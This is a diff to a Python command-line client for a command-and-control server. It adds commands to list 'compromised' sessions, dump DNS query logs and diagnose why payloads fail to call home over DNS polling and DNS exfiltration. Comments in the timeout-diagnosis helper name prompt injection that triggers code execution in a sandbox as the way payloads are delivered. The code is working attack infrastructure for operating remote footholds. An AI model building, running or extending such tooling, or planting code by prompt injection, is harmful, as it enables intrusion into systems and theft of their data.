@@ -54,7 +54,13 @@ def send(command, session):
     type=int,
     help="Polling interval in seconds when waiting (default: 2)",
 )
-def receive(session, wait, poll_interval):
+@click.option(
+    "--since",
+    default=0,
+    type=int,
+    help="Only show outputs with ID greater than this (default: 0, show all)",
+)
+def receive(session, wait, poll_interval, since):
     """
     Receive output from a compromised session.
 
@@ -62,10 +68,10 @@ def receive(session, wait, poll_interval):
     Examples:
       c2 receive -s sess_abc123
       c2 receive -s sess_abc123 --wait 30
-      c2 receive -s sess_abc123 -w 15 --poll-interval 1
+      c2 receive -s sess_abc123 --since 1 --wait 30
     """
     manager = SessionManager()
-    last_output_id = 0
+    last_output_id = since
     start_time = time.time()
     got_output = False
 
@@ -227,7 +233,8 @@ def attach(session):
 
                     if not got_output:
                         click.echo(f"[!] No output after {timeout}s")
-                        click.echo("[*] Use 'status' to check later\n")
+                        click.echo("[*] Running diagnostics...\n")
+                        _diagnose_timeout(manager, session)
                 else:
                     click.echo("[!] Failed to send command\n")
 
@@ -256,3 +263,181 @@ def status():
     else:
         click.echo("[!] Cannot reach C2 server", err=True)
         raise SystemExit(1)
+
+
+@click.command()
+def sessions():
+    """List active C2 sessions."""
+    manager = SessionManager()
+
+    session_list = manager.list_sessions()
+    if not session_list:
+        click.echo("[*] No sessions found")
+        return
+
+    # Table header
+    click.echo(
+        f"{'Session ID':<20} {'Last Seen':<14} {'Pending':<10} "
+        f"{'Chunks':<10} {'Status'}"
+    )
+    click.echo("-" * 72)
+
+    for s in session_list:
+        sid = s.get("id", "?")
+        ago = s.get("last_seen_ago", "?")
+        pending = s.get("pending_commands", 0)
+        delivering = s.get("has_pending_delivery", False)
+        chunks = s.get("output_chunks", 0)
+        terminated = s.get("terminated", False)
+
+        if terminated:
+            status_str = "terminated"
+        elif delivering:
+            status_str = "delivering"
+        elif isinstance(ago, (int, float)) and ago > 60:
+            status_str = "stale"
+        else:
+            status_str = "active"
+
+        ago_str = f"{ago}s ago" if isinstance(ago, (int, float)) else str(ago)
+        click.echo(
+            f"{sid:<20} {ago_str:<14} {pending:<10} "
+            f"{chunks:<10} {status_str}"
+        )
+
+
+@click.command()
+def debug():
+    """
+    Full debug dump of C2 server state.
+
+    Shows recent DNS queries, session state, and server uptime.
+    Useful for diagnosing why payloads aren't calling home or
+    commands aren't being delivered.
+    """
+    manager = SessionManager()
+
+    info = manager.get_debug_info()
+    if not info:
+        click.echo("[!] Could not retrieve debug info from C2 server", err=True)
+        raise SystemExit(1)
+
+    # Server uptime
+    uptime = info.get("server_uptime", 0)
+    mins, secs = divmod(int(uptime), 60)
+    hours, mins = divmod(mins, 60)
+    click.echo(f"\nServer uptime: {hours}h {mins}m {secs}s")
+    click.echo(f"DNS queries in buffer: {info.get('total_dns_queries_in_buffer', 0)}")
+
+    # Active sessions
+    active = info.get("active_sessions", {})
+    click.echo(f"\n--- Sessions ({len(active)}) ---")
+    if active:
+        for sid, state in active.items():
+            ago = state.get("last_seen_ago", "?")
+            pending = state.get("pending_commands", 0)
+            polls = state.get("poll_count", 0)
+            chunks = state.get("output_chunks", 0)
+            terminated = state.get("terminated", False)
+            delivering = state.get("has_pending_delivery", False)
+            flags = []
+            if terminated:
+                flags.append("TERMINATED")
+            if delivering:
+                flags.append("DELIVERING")
+            flag_str = f" [{', '.join(flags)}]" if flags else ""
+            click.echo(
+                f"  {sid}: last_seen={ago}s ago, "
+                f"pending={pending}, polls={polls}, "
+                f"output_chunks={chunks}{flag_str}"
+            )
+    else:
+        click.echo("  (none)")
+
+    # Output buffer
+    output_buf = info.get("output_buffer", {})
+    if output_buf:
+        click.echo(f"\n--- Output Buffer ---")
+        for sid, count in output_buf.items():
+            click.echo(f"  {sid}: {count} chunks buffered")
+
+    # Recent DNS queries
+    queries = info.get("recent_dns_queries", [])
+    click.echo(f"\n--- Recent DNS Queries (last {len(queries)}) ---")
+    if queries:
+        for q in queries:
+            click.echo(
+                f"  {q.get('ts', '?')}  {q.get('src', '?')} -> "
+                f"{q.get('name', '?')} ({q.get('type', '?')})"
+            )
+    else:
+        click.echo("  (none)")
+
+    click.echo()
+
+
+def _diagnose_timeout(manager, session_id):
+    """Auto-diagnose why a command timed out with no output."""
+    info = manager.get_debug_info()
+    if not info:
+        click.echo("[!] Could not reach C2 server for diagnostics")
+        click.echo("[*] Use 'status' to check later\n")
+        return
+
+    queries = info.get("recent_dns_queries", [])
+    active = info.get("active_sessions", {})
+    session_state = active.get(session_id, {})
+
+    # Check if the session appears in recent DNS queries
+    session_queries = [q for q in queries if session_id in q.get("name", "")]
+    has_polls = any("cmd." in q.get("name", "") for q in session_queries)
+    has_chunks = any(
+        q.get("name", "").startswith("c") and session_id in q.get("name", "")
+        for q in session_queries
+    )
+
+    click.echo(f"--- Timeout Diagnosis for {session_id} ---")
+
+    if not session_queries:
+        click.echo(
+            "[!] DIAGNOSIS: Payload never called home.\n"
+            "    No DNS queries from this session in the last 200 queries.\n"
+            "    Likely causes:\n"
+            "      - Prompt injection did not trigger code execution\n"
+            "      - Session ID mismatch between payload and attach\n"
+            "      - Payload hit a syntax error before DNS polling started\n"
+        )
+    elif has_polls and not has_chunks:
+        pending = session_state.get("pending_commands", 0)
+        delivering = session_state.get("has_pending_delivery", False)
+        if pending > 0 or delivering:
+            click.echo(
+                "[!] DIAGNOSIS: Command queued but not fetched.\n"
+                f"    Session IS polling (seen in DNS), and command is staged.\n"
+                "    Likely causes:\n"
+                "      - Payload may have crashed after polling started\n"
+                "      - DNS response not reaching the sandbox (network issue)\n"
+            )
+        else:
+            click.echo(
+                "[!] DIAGNOSIS: Payload IS polling, but no command was delivered.\n"
+                "    The session polls for commands but nothing was queued.\n"
+                "    Likely causes:\n"
+                "      - Command was consumed by a previous attach/send\n"
+                "      - Race condition: command cleared before fetch\n"
+            )
+    elif has_chunks:
+        click.echo(
+            "[!] DIAGNOSIS: Command was delivered but no output received.\n"
+            "    Chunk fetch queries are visible — the payload got the command.\n"
+            "    Likely causes:\n"
+            "      - Command execution is still in progress (slow command)\n"
+            "      - Exfiltration DNS queries are being blocked\n"
+            "      - Payload crashed during command execution\n"
+        )
+    else:
+        click.echo(
+            "[?] DIAGNOSIS: Inconclusive.\n"
+            f"    Found {len(session_queries)} DNS queries for this session.\n"
+            "    Run 'c2 debug' for full diagnostics.\n"
+        )
